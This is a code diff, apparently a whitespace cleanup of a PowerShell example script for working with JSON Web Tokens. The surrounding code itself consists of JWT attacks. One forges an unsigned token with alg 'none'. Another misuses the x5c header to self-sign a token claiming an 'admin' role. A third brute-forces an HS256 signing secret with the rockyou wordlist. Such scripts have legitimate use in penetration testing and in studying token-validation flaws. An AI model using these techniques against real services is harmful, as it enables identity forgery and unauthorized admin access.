@@ -74,7 +74,6 @@ $headerHashTable.Remove("x5t")
 $headerHashTable.alg = "none"
 
 $newHeader = $headerHashTable | ConvertTo-JwtPart
-
 $unalteredPayload = Get-JsonWebTokenPayload -JsonWebToken $jwt -AsEncodedString
 
 $alteredJwt = "{0}.{1}." -f $newHeader, $unalteredPayload
@@ -82,17 +81,11 @@ $alteredJwt = "{0}.{1}." -f $newHeader, $unalteredPayload
 
 # x5c claim misuse
 $cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"
-
 $x5c = Convert-X509CertificateToBase64 -Certificate $cert -NoFormat
-
 $encodedThumbprint = ConvertTo-Base64UrlEncodedString -Bytes $cert.GetCertHash()
-
 $jwtHeader = @{typ="JWT";alg="RS256";kid=$encodedThumbprint;x5c=$x5c} | ConvertTo-JwtPart
-
 $jwtPayload = @{sub="username@company.com";role="admin"} | ConvertTo-JwtPart
-
 $jwtSansSig = "{0}.{1}" -f $jwtHeader, $jwtPayload
-
 $signature = New-JwtSignature -JsonWebToken $jwtSansSig -HashAlgorithm SHA256 -Certificate $cert
 
 $signedJwt = "{0}.{1}" -f $jwtSansSig, $signature
@@ -102,15 +95,13 @@ $signedJwt = "{0}.{1}" -f $jwtSansSig, $signature
 $jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNjQ0NzIsIm5iZiI6MTYwNjA2NDQ3MiwiZXhwIjoxNjA2MDY0NzcyLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.VFKBN8RI0uch0TjtUwrj6MG_StImW3eBdkOqLkTQwfA"
 
 $wordListFilePath = "./rockyou.txt"
-
 $wordList = [System.IO.File]::ReadAllLines($wordListFilePath)
 
 foreach ($secret in $wordList)
 {
     if ($secret.Trim().Length -ge 1)
     {
-        [bool]$cracked = Test-JsonWebToken -JsonWebToken $jwt -Key $secret.Trim() -HashAlgorithm SHA256
-    
+        [bool]$cracked = Test-JsonWebToken -JsonWebToken $jwt -Key $secret.Trim() -HashAlgorithm SHA256    
         if ($cracked)
         {
             $outputMessage = "Secret was: {0}" -f $secret
